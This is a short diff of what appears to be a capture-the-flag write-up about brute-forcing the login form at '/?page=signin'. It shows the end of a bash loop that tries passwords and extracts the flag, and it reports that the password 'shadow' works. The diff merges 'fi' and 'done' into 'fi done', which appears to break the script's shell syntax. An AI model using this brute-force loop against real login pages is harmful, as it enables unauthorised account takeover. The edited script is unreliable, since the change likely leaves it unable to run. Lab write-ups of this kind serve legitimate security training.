@@ -34,8 +34,7 @@ The login form at `/?page=signin` is vulnerable to brute force attacks, allowing
     flag=$(echo "$resp" | grep -oP 'The flag is : \K[a-f0-9]{64}')
     echo "Success! Username: admin | Password: $pwd | Flag: $flag"
     break
-  fi
-done
+  fi done
   ```
 - Password `shadow` is found to work.
 
